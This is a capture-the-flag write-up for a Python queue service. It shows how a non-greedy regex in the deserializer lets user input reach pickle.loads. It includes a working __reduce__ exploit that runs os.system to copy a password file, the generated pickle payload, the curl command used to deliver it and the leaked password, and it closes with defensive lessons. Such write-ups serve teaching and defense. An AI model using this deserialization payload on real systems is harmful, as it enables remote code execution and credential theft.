## Level 5: validate input strictly enough

This is a quite realistic challenge:
the code is not trivial,
not badly written,
and it doesn't have too obvious mistakes.

What can we see easily?
The description tells us the program is an uppercasing service,
and we can use it like this:
```
$ curl localhost:8005 -d 'hello friend'
{
    "processing_time": 1.621246337890625e-05, 
    "queue_time": 0.2028050422668457, 
    "result": "HELLO FRIEND"
}
```

The description also mentions that the service is structured as a queue server and worker.
Sure enough,
in the `main` method we can see two modes of invocation,
using `worker` or `server` as the command line argument.

We could play with random invalid inputs,
but that won't really give anything interesting.
This time we really have to dig into the code.
Let's start by tracking down how the input is processed.

As we are sending the input using HTTP,
let's find the HTTP service implementation:
the `QueueHttpServer` class has two methods for handling GET and POST requests.
The `do_GET` method simply prints a help message and doesn't handle any inputs.
The `do_POST` method takes the POST data and passes it to a new `QueueServer` instance:
```
    def do_POST(self):
        length = int(self.headers.getheader('content-length'))
        post_data = self.rfile.read(length)
        raw_data = urllib.unquote(post_data)

        queue = QueueServer()
        job = Job()
        type, data, job = queue.run_job(data=raw_data, job=job)
        # ...
```
It passes the input to `QueueUtils.enqueue`:
```
class QueueServer(object):
    # Called in server
    def run_job(self, data, job):
        QueueUtils.enqueue('JOB', data, job)
        # ...
```
... which in turn passes it to `QueueUtils.serialize`:
```
    @staticmethod
    def enqueue(type, data, job):
        # ...
        serialized = QueueUtils.serialize(type, data, job)
        # ...
```
... where we can finally see something interesting:
```
    @staticmethod
    def serialize(direction, data, job):
        serialized = """type: %s; data: %s; job: %s""" % (direction, data, pickle.dumps(job))
        # ...
```
Remember that the `POST` data we send from `curl` is now in the `data` variable.
We can trace back that `type` can be either "JOB" or "RESULT",
`data` is whatever we send with `curl`,
and `job` is a `Job` object,
serialized to a string using the `pickle.dumps` call.
The result will look like this:
```
type: JOB; data: OUR_DATA; job: JOB_OBJ_AS_PICKLE
```

Is this safe?
What will happen if we send `x; job: hello` as the input?
```
type: JOB; data: x; job: hello; job: JOB_OBJ_AS_PICKLE
```
We don't know yet how this serialized string will be used later,
but having two `job:` segments there might be an interesting corner case.
Let's see what actually happens if we call the service with such input:
```
$ curl localhost:8005 -d 'x; job: hello'
{
    "result": "Job timed out"
}
```
That doesn't look too good.
Let's track down what happens to the serialized string.
Notice the `deserialize` method in `QueueUtils`:
```
    @staticmethod
    def deserialize(serialized):
        parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
        match = parser.match(serialized)
        direction = match.group(1)
        data = match.group(2)
        job = pickle.loads(match.group(3))
```
Look at the regular expression used when setting `parser`.
Since data is matched with the non-greedy pattern `.*?`,
using an input like `; job: EVIL_CODE`,
we can trick the program into matching `EVIL_CODE` as the content of `job`,
and run `pickle.loads` on it.

How can we exploit `pickle.loads`?
For that,
we need to dig into the documentation of pickle:
http://docs.python.org/library/pickle.html,
and in particular, the `__reduce__()` method:

> When the Pickler encounters an object of a type it knows nothing about,
it looks in two places for a hint of how to pickle it.
One alternative is for the object to implement a `__reduce__()` method.
If provided,
at pickling time `__reduce__()` will be called with no arguments,
and it must return either a string or a tuple.
>
> (...)
>
> When a tuple is returned,
it must be between two and five elements long.
(...)
The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time.
>
> The semantics of each element are:
>
> A callable object that will be called to create the initial version of the object.
The next element of the tuple will provide arguments for this callable,
and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.

Based on this info,
we can create a class,
and implement the `__reduce__` method to have the following properties:

- Return a tuple.
- The first item in the tuple should be a callable.
- The second item should be a tuple of arguments for the callable.

But what should be the callable and its arguments?
Perhaps the Python equivalent of shellcode?
For example,
`os.system` as the callable,
and a shell command as its argument:
```
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /home/level05/.password > /tmp/p',))

print '; job: ' + pickle.dumps(Exploit())
```

Let's save this in a file,
say `exploit.py`,
run it, and save its output in a text file:
```
$ python exploit.py | tee pickle.txt
; job: cposix
system
p0
(S'cat /home/level05/.password > /tmp/p'
p1
tp2
Rp3
.
```
Let's send this to the service:
```
$ curl localhost:8005 --data-urlencode @pickle.txt
{
    "result": "Job timed out"
}
$ cat /tmp/p
diebasuw
```

Bingo! The injected code was unpickled and executed,
copying the content of the password file to a place where we can see it.

## Lessons to learn

- Read the docs well:
  the documentation of pickle warns not to unpickle untrusted text,
  loud and clear.

- Make sure your input validation is strict enough.

